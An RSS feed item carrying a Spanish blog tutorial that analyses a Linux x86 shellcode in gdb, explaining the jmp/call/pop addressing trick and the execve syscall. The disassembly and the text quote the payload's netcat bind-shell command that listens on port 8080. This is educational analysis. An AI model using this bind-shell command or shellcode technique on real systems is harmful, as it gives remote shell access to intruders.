<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="../assets/xml/rss.xsl" media="all"?><rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>deibit (exploit)</title><link>http://deibit.com/</link><description></description><atom:link href="http://deibit.com/categories/exploit.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><lastBuildDate>Thu, 21 Jul 2016 20:59:48 GMT</lastBuildDate><generator>https://getnikola.com/</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>Analizando un shellcode (II)</title><link>http://deibit.com/posts/2011/02/12/analizando-un-shellcode-ii/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Tenemos el desemsamblado del programa (shellcode.c), vamos a ir viendo paso a paso la ejecución:&lt;/p&gt;
&lt;p&gt;En gris se encuentra resaltada la parte donde se encuentra la cadena “./bin/nc -lp8080 -e /bin/sh”&lt;/p&gt;
&lt;p&gt;[sourcecode highlight="20,21,22,23,24,25,26,27"]&lt;br&gt;
(gdb) x/38i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a077 &amp;lt;shellcode+55&amp;gt;:	arpl   %sp,(%ebx)&lt;br&gt;
   0x804a079 &amp;lt;shellcode+57&amp;gt;:	sub    $0x3038706c,%eax&lt;br&gt;
   0x804a07e &amp;lt;shellcode+62&amp;gt;:	cmp    %dh,(%eax)&lt;br&gt;
   0x804a080 &amp;lt;shellcode+64&amp;gt;:	and    0x69622f65,%ebp&lt;br&gt;
   0x804a086 &amp;lt;shellcode+70&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a087 &amp;lt;shellcode+71&amp;gt;:	das&lt;br&gt;
   0x804a088 &amp;lt;shellcode+72&amp;gt;:	jae    0x804a0f2&lt;br&gt;
   0x804a08a &amp;lt;shellcode+74&amp;gt;:	and    (%eax),%eax&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Una vez que se consigue explotar una vulnerabilidad y desviar el flujo de ejecución del programa hacia nuestro shellcode la primera instrucción es un salto:&lt;/p&gt;
&lt;p&gt;0x804a040 :   jmp    0x804a06c &lt;/p&gt;
&lt;p&gt;que lleva a una llamada:&lt;/p&gt;
&lt;p&gt;0x804a06c :     call   0x804a042 &lt;/p&gt;
&lt;p&gt;que vuelve a posicionarnos justo debajo del salto:&lt;/p&gt;
&lt;p&gt; 0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;¿Curioso no? ¿Para que tanto ir y volver si acabamos justo debajo de donde empezamos?&lt;/p&gt;
&lt;p&gt;Principalmente por dos razones:&lt;/p&gt;
&lt;p&gt;1.- Evitar bytes nulos ’0x00′. Esto se hace al efectuar el salto ‘jmp’. Si hubiésemos usado un call añadiríamos bytes nulos.&lt;br&gt;
2.- Necesitamos una referencia. Una dirección sobre la que pivotar. &lt;/p&gt;
&lt;p&gt;Respecto del primer punto es obvio y ya se comentó antes. El segundo tiene su explicación.&lt;/p&gt;
&lt;p&gt;Nuestro shellcode debe ser independiente de la posición donde se encuentre el código. Recordemos que nuestro código se va a ejecutar en la pila y que las direcciones de la pila cambiarán en cada ejecución debido al carácter dinámico de esta. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;¿Como obtener ese punto de referencia?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Al efectuar una llamada ‘call   0x804a042 ‘ se va a dejar en la pila la dirección de retorno para que cuando se vuelva de la llamada el flujo de ejecución prosiga. Ahora bien, si observamos…¿Que hay debajo de la llamada? &lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;La cadena “./bin/nc -lp8080 -e /bin/sh”.&lt;/p&gt;
&lt;p&gt;Por lo tanto ya tenemos en la pila, en una posición conocida, la dirección de la cadena para usarla como parámetro para la llamada al sistema.&lt;/p&gt;
&lt;p&gt;Ese pop que vimos:&lt;/p&gt;
&lt;p&gt; 0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;Va a almacenar la dirección de retorno que se a “pusheado” en la pila al efectuar la llamada en el registro “esi”.&lt;/p&gt;
&lt;p&gt;Vemos la secuencia con más detenimiento:&lt;/p&gt;
&lt;p&gt;Saltamos:&lt;br&gt;
0x804a040 :	jmp    0x804a06c &lt;/p&gt;
&lt;p&gt;Creamos la llamada, depositando la dirección de retorno en la pila:&lt;br&gt;
0x804a06c :     call   0x804a042 &lt;/p&gt;
&lt;p&gt;Y sacamos de la pila esa dirección almacenándola en “esi”:&lt;br&gt;
0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;La llamada al sistema &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;La finalidad última del shellcode estudiado es llamar al programa ‘netcat’ abriendo el puerto 8080 para poner en él a la escucha una shell.&lt;/p&gt;
&lt;p&gt;Esto lo hace a través de una syscall. Una llamada al sistema. &lt;/p&gt;
&lt;p&gt;En el código podemos situarla aquí:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Se cargan los parámetros en los registros eax, ebx, ecx y edx. Y se llama a la interrupción 0x80. Esta interrupción le indica al kernel que queremos efectuar una llamada al sistema. &lt;/p&gt;
&lt;p&gt;Exactamente qué llamada va a ir indicada en el registro eax. Y va a ir designada por un número definido por una constante en un fichero:&lt;/p&gt;
&lt;p&gt;(el fichero es unistd.h, pero en Ubuntu para 32 bits, por ejemplo, la veremos en la ruta indicada abajo)&lt;/p&gt;
&lt;p&gt;$ cat /usr/include/asm/unistd_32.h &lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp" highlight="19"]&lt;br&gt;
#ifndef _ASM_X86_UNISTD_32_H&lt;br&gt;
#define _ASM_X86_UNISTD_32_H&lt;/p&gt;
&lt;p&gt;/*&lt;br&gt;
 * This file contains the system call numbers.&lt;br&gt;
 */&lt;/p&gt;
&lt;p&gt;#define __NR_restart_syscall      0&lt;br&gt;
#define __NR_exit		  1&lt;br&gt;
#define __NR_fork		  2&lt;br&gt;
#define __NR_read		  3&lt;br&gt;
#define __NR_write		  4&lt;br&gt;
#define __NR_open		  5&lt;br&gt;
#define __NR_close		  6&lt;br&gt;
#define __NR_waitpid		  7&lt;br&gt;
#define __NR_creat		  8&lt;br&gt;
#define __NR_link		  9&lt;br&gt;
#define __NR_unlink		 10&lt;br&gt;
#define __NR_execve		 11&lt;br&gt;
#define __NR_chdir		 12&lt;br&gt;
#define __NR_time		 13&lt;br&gt;
#define __NR_mknod		 14&lt;br&gt;
#define __NR_chmod		 15&lt;br&gt;
#define __NR_lchown		 16&lt;br&gt;
#define __NR_break		 17&lt;br&gt;
…&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Si observamos lo que estamos cargando en eax:&lt;/p&gt;
&lt;p&gt;  0x804a060 :	mov    $0xb,%al&lt;/p&gt;
&lt;p&gt;En decimal ’0xb’ es ’11′ lo que correspondería a:&lt;/p&gt;
&lt;p&gt;#define __NR_execve		 11&lt;/p&gt;
&lt;p&gt;la llamada al sistema execve. &lt;/p&gt;
&lt;p&gt;Si miramos su página man:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
EXECVE(2)                                          Linux Programmer’s Manual                                         EXECVE(2)&lt;/p&gt;
&lt;p&gt;NAME&lt;br&gt;
       execve – execute program&lt;/p&gt;
&lt;p&gt;SYNOPSIS&lt;br&gt;
       #include &amp;lt;unistd.h&amp;gt;&lt;/p&gt;
&lt;p&gt;       int execve(const char *filename, char *const argv[],&lt;br&gt;
                  char *const envp[]);&lt;/p&gt;
&lt;p&gt;DESCRIPTION&lt;br&gt;
       execve()  executes the program pointed to by filename.  filename must be either a binary executable, or a script start‐&lt;br&gt;
       ing with a line of the form:&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Vemos que necesita 3 parámetros: filename, argv y envp. Respectivamente, el nombre del programa, un array con los parámetros para ese programa y un array con las variables de entorno para ese programa que queramos fijar. &lt;/p&gt;
&lt;p&gt;Estos parámetros van a ir en los otros registros que hemos visto: ebx, ecx y edx.&lt;/p&gt;
&lt;p&gt;Más en la siguiente entrega.&lt;/p&gt;
</description><category>Basic</category><category>exploit</category><category>exploiting</category><category>gdb</category><category>seguridad</category><category>shellcode</category><guid>http://deibit.com/posts/2011/02/12/analizando-un-shellcode-ii/</guid><pubDate>Sat, 12 Feb 2011 09:45:22 GMT</pubDate></item></channel></rss>